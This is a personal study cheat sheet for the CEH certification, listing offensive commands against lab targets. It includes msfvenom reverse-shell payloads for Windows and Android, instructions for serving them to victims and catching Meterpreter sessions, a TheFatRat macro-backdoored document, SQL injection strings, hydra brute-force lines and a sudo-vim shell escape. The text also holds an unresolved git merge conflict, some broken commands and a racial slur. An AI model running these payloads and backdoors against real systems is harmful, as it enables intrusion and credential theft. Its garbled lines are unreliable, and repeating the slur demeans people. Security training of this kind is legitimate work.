CEH
- [x] Footprinting
- [x] Scanning
- [x] Enumeration
- [x] Vulnerability Analysis
- [x] System Hacking
** Gaining Access **
- [x] Cracking passwords
- [x] Vulnerability Exploitation
** Escalating Privileges **
** Maintaining Access **
- [x] Executing Applications
- [x] Hiding Files
** Clearing Logs **
- [x] Covering Tracks

#### Online Resources
- [videos - mega](https://mega.nz/folder/mOQTSCQS#NhXNE3XlL6fkGun83Yjwcw)
- [Ethical hacking labs writeup - git ](https://github.com/Samsar4/Ethical-Hacking-Labs)
- [Meet -CEHv11 lab videos](https://meet.runitcr.com/b/ste-j10-2sr-7l9?page=1#recordings-table)

#### Enumeration
#### host enumation
host and service enumeration
````js
//discover devices inside the network eth0
netdiscover -i eth0
nmap -sN 10.10.10.0/24
// enumeration
netstat -a 10.10.10.10 // netstat enumeration netbios
snmp-check 10.10.10.10 // extract users from netbios - parrot
enum4linux

sudo nmap -vv -p 1-1000 -sC -A 10.10.10.10 -oN nmap_scan
nmap -p- -sS -min-rate 10000 -Pn -n 10.10.10
nmap -6 www.scanme.com // scan IPV6
nmap -sC -sV -vvv -T5 -p 80,21,2222 10.10.10
sudo nmap -v -sV -sC
nmap -Pn -sS -n 10.10.. -T4 -oN nmap_scan // [prefer] fast scan ufo mode
nmap -v -p- -sV -sC -T4 10.10 -oN nmap_scan // UDP/TCP scanning
sudo nmap -p- -Pn -vvv -sS 10.10.. -oN nmap_scan
nmap -sS -sV -A -O -Pn
nmap -sV -sT -sU -A 10.10.. -oN nmap_scan
sudo nmap -p- 10.10.. --open -oG nmap/AllPorts -vvv -Pn -n -sS
sudo nmap -p22,80 -sV -sC -Pn -n 10.10.. -oN nmap/openports -vvv
nmap -sV -p 22,443 10.10../24 // scan mi net 24
nmap -sU -p 161 -sV -sC 10.10.. // UDP Scan
nmap -A --min-rate=5000 --max-retries=5 10.10.. // optimize scan time
<<<<<<< HEAD
nmap -Pn -sS -A -oX test 10.10.10.0/24 // Scanning the network and subnet

-PR = ARP ping scan
-PU = UDP ping scan
=======
nmap -Pn -sS -A -oX test 10.10.../24 // scanning network subnet

//scripts
snmp //extract users of the network port 161

-PR = ARP ping scan
-PE = ICMP scan echo
-PU = UDP ping scan
-oX = save XMl
>>>>>>> df364a4f409faf7bc6bb4b291db58d3dcabb2bb9
-vv = verbose
-p = ports
-sC = default scripts
-A = agressive scan
-oN = save in a file
-sS = syn scan is untrusive because don't complete the petitions
-n = no resolution of dns
-p- = all ports
-sV = Probe open ports to determine service/version inf
-T4 = Timing scanning <1-5>
-o = output to save the scan
-sT = TCP port scan
-sU = UDP port scan
-A = Agressive/ OS detection  
--open = all ports open
-oG = save in a grep format
-Pn = no do ping to the ip
-n = dont resolve domain names
--max-retries = 1 default verify 10 times.
-O = verifica el sistema operativo

// My niggerian methodology
nmap -sV -sC nmap 10.10.10.x #top1000ports
nmap -sC -sV -v -oN nmap.txt
masscan -e tun0 -p1-65535 -rate=1000 <ip>
sudo nmap -sU -sV -A -T4 -v -oN udp.txt ip
````

#### default ports
| port | name|
| :--- | :--- |
| 3306 | mysql --script mysql-info mysql-enum|
| 3389 | rdp port remote port
| 25 | smtp mail
| 80 | http
| 443 | https
| 20 | ftp
| 23 | telnet
| 143 | imap
| 22 | ssh
| 53 | dns



#### Web Enumeration
````js
// dir enumeration
gobuster dir -u 10.10.. -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q

dir : directory listing
-u : host
-w : wordlists
-t : threads int / Number of concurrent threads (default 10)
-x : enumerate hidden files htm, php
-q : –quiet / Don’t print the banner and other noise

// wordpress enumeration
wpscan --url https://localchost.com --passwords=
wpscan -u 10.10.. -e u vp
wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce

-e = enumerate
u = enumerate usernames
vp = vulnerable plugins

// wordlist generation
cewl -w wordlist -d 2 -m 5 http://wordpress.com
-d = deeph of the scanning
-m = long of the words
-w = save to a file worlist
````

#### web explotation
````js
// sql injection
sqlmap -u http://10.10.197.40/administrator.php --forms --dump

-u = url
--forms = grab the forms /detect
--dump = retrieve data form de sqli

#### basic sqli injection
sqlmap -u 10.10.77.169 --forms --dump

- u = url
- --forms= check the forms automatically
- --dump= dump dthe database data entries

// extract database
sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
// extract colums
Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
// extract data of the table and the column inside of the db
sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
````

#### enumeration
````
enum4linux 10.10.60.11
````

#### bruteforcing
````
hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
hydra -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.118
````

#### stego
````js
exiftool cats.png
zsteg cats.png
binwalk -d cats.png

// windows
snow -C -p "magic" readme2.txt
-p = passowrd
//image steganography
openstego > extract dat > 

//stegseek to crack stego password
````

#### windows rpc mal configurado
````
rpcclient 10.10.123.10
````

#### hashcracking
**hashcat**
````terminal
hashcat -O -w3 -m 0 56ab24c15b72a457069c5ea42fcfc640 /usr/share/wordlists/rockyou.txt --show

-m = type of hash
-a = attack mode (1-3) 3 bruteforcing
--show = mostrar hash crackeado

hashcat -O -A 0 -m 20 salt12314124:passowrdmd523432 /usr/share/worlist/rockyou.txt
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --show
````

**john**
````
john --format=Raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt

- --format = hash format '--list=formats | grep MD5'
- hash = file - echo '123213dasd' >> hash
- wordlist= = wordlist to crack

### to show the hash cracked
john --show --format=Raw-MD5 hash

- --show = show the hash:Cracked
````

**cryptography**
```js
//HashCalc
take a file and open into hashcalc
i will give you the the hash for md5 or other algorithms

// MD5 calculator
it will compare both files what we need get the md5

// HashMyFiles
it allow you to hash all the files inside a folder

// Veracrypt
```

**rainbowtables**
```js
Rainbowtables are already hash with password to perform cracking without calculate a new hash.
// linux
rtgen // rainbowcrack
rtgen sha256 loweralpha-numeric 1 10 0 1000 4000 0 // generate a new rainbow table
// windows
rtgen md5 loweralpha-hnumeric 1 4 1 1000 1000 0 //
then use app rainbowcrack // add the hashes and the rainbow table option
```

#### enumerating -samba
````
search for commands
smbmap --help | grep -i username

smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
-x = command
````

### wireshark
````js
### wireshark filters

// filters by post
http.request.method==POST
smtp // email
pop // email
dns.qry.type == 1 -T fields -e dns.qry.name = show records present in this pcap
dns.flags.response == 0 = There are 56 unique DNS queries.
tcp // show tcp packets
//find packets
edit > find packets > packet list : packet bytes > case sensitive: strings > string "pass" :search

//DDOS ATTACK
look number of packets first column
then >statistics > ipv4 statistics > destination and ports

/// tshark cli
tshark -r dns.cap | wc -l //count how many packets are in a capture
tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name //show records present in this pcap
tshark -r dnsexfil.pcap -Y "dns.flags.response == 0" | wc -l 
tshark -r pcap -T fields -e dns.qry.name | uniq | wc -l //There are 56 unique DNS queries.
tshark -r pcap | head -n2 //DNS server side to identify 'special' queries
tshark -r pcap -Y "dns.flags.response == 0" -T fields -e "dns.qry.name" | sed "s/.m4lwhere.org//g" | tr -d "\n" `exfiltrate data with regx`
````

#### Privilege scalation reverse shell

````
ssh -p 2222 mith@10.10.123.23
sudo -ls ###list de su permisions

sudo vim -c ':!/bin/sh' ### privilege scalation
````
https://gtfobins.github.io/

#### other
``````Js
hydra -l root -P passwords.txt [-t 32] ftp
hydra -L usernames.txt -P pass.txt mysql
hashcat.exe -m hash.txt rokyou.txt -O
nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 0.10.10 
wpscan --url https://10.10.10.10 --enumerate u
netdiscover -i eth0
john --format=raw-md5 password.txt [ To change password to plain text ]
``````

#### vulnerability scanning
```
nikto -h url -Cgidirs all
```

#### System hacking
```js
// 1 - on a windows machine
wmic useraccount get name,sid //list users
// using a tool
Pwdump7.exe >> /path/file.txt //get a file to crack
// using ophcrack to crack the hash with rainbow tables
ophcrack >> tables >> vista free
// cracking with rainbow tables using winrtgen to create a rainbow table
winrtgen >> add table >> hashntlm
rainbowcrack >> select the obtained file >> select dircreatd with winrtgen

// 2 - using responder to capture the traffic of the windows system
//run a shared folder on windows
//capture the ntlm hash >> cracking with jhon
chmod +x responder.py
./Responder.py -I eth0
-I = interface //ifconfig
// cracking the ntlm capture with ntlm
john capture.txt

lopthcr4ck // helps to crack ntlm passwords store on windows

// system hacking windows
// look for an exploit and try to get remote access to the victim using msfvnom,metasploit and rat

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=my.ip LPORT=my.port -o /root/Desktop/test.exe
-p = payload
--platform = Os
-a = architecture
-f = format of the payload
-o = output dir

// now with try to share the file with the victim
// we try three forms
// #1 - option
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
// copy the text.exe to the new server
cp /root/Desktop/test.exe /var/www/html/share
// #2 - option
python -m SimpleHttpServer 80
// #3 - option
python3 http.server 80
// start the serverwith apache
service apache2 start //apache version
//now we open msfconsole to gain a inverse shell with meterpreter
use exploit/multi/handler //similar to nc -nlvp .port
set payload windows/meterpreter/reverse_tcp
set LHOST my.ip
set LPORT my.port
exploit/run // run the exploit
//share the file with the victim
my.ip/share
//inside the victim's machine
run the exe // text.exe share with the server
//look at the metasploit session
sysinfo // system info

//now with try to enumerate to know misconfigurations on the w10 system
//using PowerSploit
upload /path/PowerUp.ps1 powerup.ps1 // with meterpreter
shell // with shell with change from meterpreter to windows shell
// now we execute powerup
powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
// now we know that windows is vulnerable to dll injection
// change to meterpreter shell with exit & run
run vnc // will open a VNC remote control on the victim

// Now we will try another method to gain access to a machine
// with TheFatRat
chmod +x fatrat
chmod +x setup.sh
chmd +x powerfull.sh
./setup.sh
//run fatrat
option 6 // create fud.. [Excelent]
option 3 // create apache + ps1
//put the lhost and lport
enter the name for files : payload
option 3 // for choosing meterpreter/reverse_tcp
// payload generated
option 9 // back to the menu
option 7 // create a back office
option 2 // macro windows and select lhost and lport
// enter the name for the doc file
// use custom exe backdoor Y
option 3 // reverse_tcp 
// backdoor inside the doc generate

// share document with the server option 1 and 2 above
// start msfconsole to gain meterpreter shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST my.ip
set RHOST my.port
exploit / run 

```

#### Mobile Hacking
```js
// create a backdoor with msfvenom
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=my.ip R > path/backdoor.apk
// share with some of the three methods above
// now with metasploit
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST my.ip
exploit -j -z // exploit with a background job
// install the apk in android & the session will open
sessions -i 1 // will display the meterpreter
sysinfo // to know the os

// Using PhoneSploit
run phonesploit
option 3 // new phone
enter the ip // ip' phone &
option 4 // to shell on the phone
//in the menu you can search, download, info
```

#### Using the methodology
1.  `netdiscover -i eth0`
2.  `map -p- 10.10.10.10 [ Any IP ]` port discovery
3. `nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10`
4. `gobuster -e -u** http://10.10.10.10 -w wordlsit.txt` on a webserver running
5. trying sqli payloads on the forms
```
admin' --  
admin' #  
admin'/*  
' or 1=1--  
' or 1=1#  
' or 1=1/*  
') or '1'='1--  
') or ('1'='1—
```
6. bruteforcing web servers
```
hydra -l root -P passwords.txt [-t 32] <IP> **_ftp_**
hydra -L usernames.txt -P pass.txt <IP> **_mysql_**
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> **_pop3_** -V
hydra -V -f -L <userslist> -P <passwlist> **_rdp_**://<IP>
hydra -P common-snmp-community-strings.txt target.com **_snmp_**
hydra -l Administrator -P words.txt 192.168.1.12 **_smb_** -t 1
hydra -l root -P passwords.txt <IP> **_ssh_**
```
7. `cewl example.com -m 5 -w words.txt` custom wordlist
8. search for vulns
```js
searchsploit 'Linux Kernel'
searchsploit -m 7618 // Paste the exploit in the current directory
searchsploit -p 7618[.c] // Show complete path
searchsploit — nmap file.xml // Search vulns inside a Nmap XML result
``` 
